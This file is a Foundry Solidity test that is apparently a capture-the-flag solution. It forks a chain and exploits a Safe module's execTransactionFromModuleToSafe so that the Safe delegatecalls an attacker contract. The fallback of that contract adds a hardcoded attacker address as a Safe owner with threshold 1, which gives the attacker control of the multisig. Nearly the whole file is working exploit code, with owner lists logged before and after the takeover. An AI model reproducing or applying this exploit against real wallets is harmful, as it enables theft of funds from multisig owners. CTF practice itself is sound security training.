// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

contract CTFTest2 is Test {
    uint256 pk;
    address user;
    string rpc;

    function setUp() public {
        pk = vm.envUint("PK");
        user = vm.envAddress("ADDR");
        rpc = vm.envString("RPC");

        vm.createSelectFork(rpc, 6600643 + 1);

        console.log("BLOCK", block.number);
        console.log("TIME ", block.timestamp);
        console.log();
    }

    function testCTF2() public {
        vm.startPrank(user);

        Module module = Module(0x452612D1fBc98a0963830912d1F8736E4e811118);
        address safe = 0x87DFd1577F61457e1e3bF122C1BB03245A42926F;

        Pranker pranker = new Pranker();

        address to = address(pranker);
        uint256 value = 0;
        bytes memory data = abi.encodeWithSelector(Safe.addOwnerWithThreshold.selector, 0xcC87B6cC86edA38b6e7C41B08da6a52cb23b2fAF, 1);
        Operation operation = Operation.Call;

        bytes memory dataM = abi.encodeWithSelector(Module.execTransactionFromModule.selector, address(pranker), 0, data, operation);

    address[] memory owners;
    owners = Safe(safe).getOwners();
    console.log(owners[0]);

    module.execTransactionFromModuleToSafe(address(module), address(pranker), 0, dataM, Operation.DelegateCall);

    owners = Safe(safe).getOwners();
    console.log(owners[0]);

    // module.execTransactionFromModule(to, value, data, operation);

        // Pranker pranker = new Pranker();
        // pranker.prank();
    }
}

contract Pranker {
    function prank() external {
        revert("asd");
    }

    fallback() external {
        // safe -> delegatecall a este contrato

        address safe = 0x87DFd1577F61457e1e3bF122C1BB03245A42926F;
        address attacker = 0xc574Bf68FeF5B7a24053C55dbe9f81c3E8D2DE92;

        // safe
        Safe(address(this)).addOwnerWithThreshold(attacker, 1);   
    }
}

interface Module {
  function execTransactionFromModule(
    address to,
    uint256 value,
    bytes memory data,
    Operation operation
  ) external returns (bool success);

  function execTransactionFromModuleToSafe(
    address safe,
    address to,
    uint256 value,
    bytes memory data,
    Operation operation
  ) external returns (bool success);
}

interface Safe {
    function addOwnerWithThreshold(address owner, uint256 _threshold) external;
    function getOwners() external view returns (address[] memory);
    function removeOwner(address prevOwner, address owner, uint256 _threshold) external;
}

    enum Operation {
        Call,
        DelegateCall
    }